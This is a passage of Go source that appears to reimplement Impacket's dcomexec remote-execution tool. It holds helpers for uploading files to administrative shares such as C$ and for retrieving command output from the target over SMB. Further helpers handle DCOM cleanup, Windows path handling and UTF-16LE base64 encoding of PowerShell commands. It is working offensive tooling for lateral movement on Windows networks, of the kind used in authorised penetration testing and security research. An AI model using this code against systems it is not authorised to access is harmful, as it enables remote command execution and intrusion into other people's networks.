		fmt.Fprintln(os.Stderr, "[-] Could not determine drive letter from path")
		return
	}

	driveShare := drive[:len(drive)-1] + "$"
	origShare := e.share

	if err := e.smbClient.UseShare(driveShare); err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to access share %s: %v\n", driveShare, err)
		return
	}

	smbPath := strings.TrimPrefix(tail, `\`)
	err := e.smbClient.Put(srcFile, smbPath)

	// Restore original share
	e.smbClient.UseShare(origShare)

	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Error uploading %s: %v\n", srcFile, err)
		return
	}
	fmt.Printf("[*] Uploaded %s to %s\n", srcFile, fullPath)
}

func (e *DCOMExec) buildPrompt() string {
	if e.shellType == "powershell" {
		return "PS " + e.pwd + "> "
	}
	return e.pwd + ">"
}

func (e *DCOMExec) ensureSMBClient() error {
	if e.smbClient != nil {
		return nil
	}
	e.smbClient = smb.NewClient(e.target, e.creds)
	if err := e.smbClient.Connect(); err != nil {
		e.smbClient = nil
		return fmt.Errorf("SMB connection failed: %v", err)
	}
	if err := e.smbClient.UseShare(e.share); err != nil {
		e.smbClient.Close()
		e.smbClient = nil
		return fmt.Errorf("failed to access %s share: %v", e.share, err)
	}
	return nil
}

func (e *DCOMExec) getOutput() string {
	if err := e.ensureSMBClient(); err != nil {
		fmt.Fprintf(os.Stderr, "[-] %v\n", err)
		return ""
	}

	outputPath := outputFilename
	maxWait := e.timeout
	waited := 0

	for {
		time.Sleep(1 * time.Second)
		waited++

		content, err := e.smbClient.Cat(outputPath)
		if err == nil {
			// Cat succeeds even while the remote process is still writing;
			// Rm is what fails with a sharing violation in that case.
			if rmErr := e.smbClient.Rm(outputPath); rmErr != nil && smb.IsSharingViolation(rmErr) {
				waited = 0
				continue
			}
			return e.decodeOutput(content)
		}

		errStr := err.Error()

		// Connection broken — reconnect and retry (matches Impacket).
		// These come from net, not smb2, so substring matching is the right tool.
		if strings.Contains(errStr, "broken") || strings.Contains(errStr, "connection reset") || strings.Contains(errStr, "use of closed") {
			e.log.Debug().Msg("Connection broken, trying to recreate it")
			e.smbClient.Close()
			e.smbClient = nil
			if err := e.ensureSMBClient(); err != nil {
				fmt.Fprintf(os.Stderr, "[-] SMB reconnection failed: %v\n", err)
				return ""
			}
			return e.getOutput()
		}

		// File not found yet — keep waiting up to timeout.
		if smb.IsNotFound(err) {
			if waited >= maxWait {
				return ""
			}
			continue
		}

		// Unknown error
		e.log.Debug().Msgf("Error reading output: %v", err)
		return ""
	}
}

// decodeOutput decodes raw output bytes using the configured codec.
// Matches Impacket's CODEC handling in get_output().
func (e *DCOMExec) decodeOutput(raw string) string {
	if e.codec == "" || strings.EqualFold(e.codec, "utf-8") || strings.EqualFold(e.codec, "utf8") {
		return raw
	}

	enc, err := ianaindex.IANA.Encoding(e.codec)
	if err != nil || enc == nil {
		e.log.Debug().Msgf("Unknown codec '%s', using raw bytes", e.codec)
		return raw
	}

	decoded, err := enc.NewDecoder().String(raw)
	if err != nil {
		e.log.Debug().Msgf("Codec decode error: %v. Try running chcp.com on the target to determine the correct codec.", err)
		return raw
	}
	return decoded
}

// cleanup calls Quit() on the DCOM object (if supported) and disconnects.
// Matches Impacket's do_exit() + cleanup.
func (e *DCOMExec) cleanup() {
	// Call Quit() on the DCOM object if available (MMC20, ShellBrowserWindow)
	// ShellWindows has no Quit (quitDISPID = nil), matching Impacket
	if e.quitDISPID != nil && e.topDisp != nil {
		_, err := e.topDisp.Invoke(e.ctx, &idispatch.InvokeRequest{
			This:             &dcom.ORPCThis{Version: e.comVer},
			DispatchIDMember: *e.quitDISPID,
			LocaleID:         0x409,
			Flags:            CYCLEDISPATCH_METHOD,
			DispatchParams:   &oaut.DispatchParams{},
		})
		if err != nil {
			e.log.Debug().Msgf("Quit() failed: %v", err)
		}
	}

	// Close SMB
	if e.smbClient != nil {
		e.smbClient.Close()
	}

	// Close DCOM connections
	if e.oxidConn != nil {
		e.oxidConn.Close(e.ctx)
	}
	if e.epmConn != nil {
		e.epmConn.Close(e.ctx)
	}
}

// ntpath helpers — minimal Windows path manipulation (no external deps)

// ntpathJoin mimics Python's ntpath.join behavior:
// - If a part starts with \, it replaces the path but keeps the drive from earlier parts
// - If a part has a drive letter, it replaces everything
func ntpathJoin(parts ...string) string {
	result := ""
	for _, p := range parts {
		if p == "" {
			continue
		}
		pDrive, pTail := ntpathSplitdrive(p)
		if pDrive != "" {
			// New drive letter — replaces everything
			result = p
		} else if len(pTail) > 0 && (pTail[0] == '\\' || pTail[0] == '/') {
			// Absolute path — keeps existing drive, replaces path
			rDrive, _ := ntpathSplitdrive(result)
			result = rDrive + p
		} else {
			// Relative — append with separator
			if result != "" && !strings.HasSuffix(result, `\`) && !strings.HasSuffix(result, "/") {
				result += `\`
			}
			result += p
		}
	}
	return result
}

func ntpathNormpath(p string) string {
	p = strings.ReplaceAll(p, "/", `\`)
	drive, tail := ntpathSplitdrive(p)
	parts := strings.Split(tail, `\`)
	var resolved []string
	for _, part := range parts {
		if part == "" || part == "." {
			continue
		}
		if part == ".." {
			if len(resolved) > 0 {
				resolved = resolved[:len(resolved)-1]
			}
			continue
		}
		resolved = append(resolved, part)
	}
	return drive + `\` + strings.Join(resolved, `\`)
}

func ntpathSplitdrive(p string) (string, string) {
	if len(p) >= 2 && p[1] == ':' {
		return p[:2], p[2:]
	}
	return "", p
}

func ntpathBasename(p string) string {
	i := strings.LastIndexAny(p, `\/`)
	if i < 0 {
		return p
	}
	return p[i+1:]
}

// encodeUTF16LEBase64 encodes a string to UTF-16LE and then Base64
func encodeUTF16LEBase64(s string) string {
	utf16Chars := utf16.Encode([]rune(s))
	bytes := make([]byte, len(utf16Chars)*2)
	for i, c := range utf16Chars {
		bytes[i*2] = byte(c)
		bytes[i*2+1] = byte(c >> 8)
	}
	return base64.StdEncoding.EncodeToString(bytes)
}

func generateRandomString(length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	b := make([]byte, length)
	rand.Read(b)
	for i := range b {
		b[i] = chars[int(b[i])%len(chars)]
	}
	return string(b)
}

func extractIPIDFromResult(result *oaut.Variant) (*dcom.IPID, error) {
	if result == nil || result.VarUnion == nil {
		return nil, fmt.Errorf("returned no result")
	}
	dispVal, ok := result.VarUnion.Value.(*oaut.Variant_VarUnion_IDispatch)
	if !ok || dispVal == nil || dispVal.IDispatch == nil {
		return nil, fmt.Errorf("did not return IDispatch interface (VT=%d)", result.VT)
	}
	ptr := (*dcom.InterfacePointer)(dispVal.IDispatch)
	ipid := ptr.IPID()
	if ipid == nil {
		return nil, fmt.Errorf("could not extract IPID from interface")
	}
	return ipid, nil
}

func newVariantBSTR(s string) *oaut.Variant {
	return &oaut.Variant{
		VT: uint16(oaut.VarEnumString),
		VarUnion: &oaut.Variant_VarUnion{
			Value: &oaut.Variant_VarUnion_BSTR{
				BSTR: &oaut.String{Data: s},
			},
		},
	}
}
